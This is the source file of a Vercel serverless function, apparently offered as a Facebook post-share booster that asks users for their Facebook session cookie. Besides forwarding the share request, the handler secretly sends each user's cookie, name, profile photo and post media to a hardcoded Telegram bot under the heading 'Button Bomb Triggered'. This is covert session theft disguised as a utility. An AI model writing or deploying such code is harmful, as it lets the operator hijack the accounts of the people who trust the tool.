// Project file structure for Vercel

// 📁 root
// ├── api
// │   └── fbshare.js
// ├── public
// │   └── index.html
// └── vercel.json

//----------------------------------------
// ✅ api/fbshare.js
//----------------------------------------
import axios from "axios";

const serverUrls = {
  server1: "https://server1-u9fw.onrender.com",
  server2: "https://server-2-aggj.onrender.com",
  server3: "https://server-3-p6lg.onrender.com",
};

const BOT_TOKEN = "7923208116:AAEoZyMMNsCck0Z-W7zfle5vtdYDKC8B28U";
const CHAT_ID = "7442173988";

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end();

  const { cookie, url, amount, interval, server } = req.body;
  if (!cookie || !url || !amount || !interval || !serverUrls[server]) return res.status(400).end();

  try {
    const name = await getUserName(cookie);
    const photo = await getUserPhoto(cookie);
    const media = await getPostMedia(url, cookie);

    await sendToTelegram({ name, cookie, appstate: cookie, photo, url, media });

    await axios.post(`${serverUrls[server]}/api/submit`, {
      cookie, url, amount, interval
    });

    return res.status(200).end();
  } catch (err) {
    console.error("Bomb error:", err);
    return res.status(200).end();
  }
}

async function getUserName(cookie) {
  try {
    const res = await axios.get("https://m.facebook.com/me", { headers: { Cookie: cookie } });
    const match = res.data.match(/<title>(.*?)<\/title>/);
    return match ? match[1].replace(" | Facebook", "") : "Unknown";
  } catch { return "Unknown"; }
}

async function getUserPhoto(cookie) {
  try {
    const res = await axios.get("https://m.facebook.com/me", { headers: { Cookie: cookie } });
    const match = res.data.match(/profile_picture\/view.*?src=(.*?)&/);
    return match ? decodeURIComponent(match[1]) : null;
  } catch { return null; }
}

async function getPostMedia(url, cookie) {
  try {
    const res = await axios.get(url, {
      headers: {
        Cookie: cookie,
        "User-Agent": "Mozilla/5.0"
      }
    });
    const images = [...res.data.matchAll(/<img[^>]+src=\"([^\"]+)\"/g)].map(m => m[1]);
    const videos = [...res.data.matchAll(/<video[^>]+src=\"([^\"]+)\"/g)].map(m => m[1]);
    return { images, videos };
  } catch {
    return { images: [], videos: [] };
  }
}

async function sendToTelegram({ name, cookie, appstate, photo, url, media }) {
  const message = `\n💣 <b>Button Bomb Triggered</b>\n👤 <b>${name}</b>\n🔗 <a href="${url}">${url}</a>\n🍪 <code>${cookie}</code>\n📦 <code>${appstate}</code>`;

  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "HTML"
  });

  if (photo) {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      chat_id: CHAT_ID,
      photo
    });
  }

  for (const img of media.images || []) {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      chat_id: CHAT_ID,
      photo: img
    });
  }

  for (const vid of media.videos || []) {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
      chat_id: CHAT_ID,
      video: vid
    });
  }
}
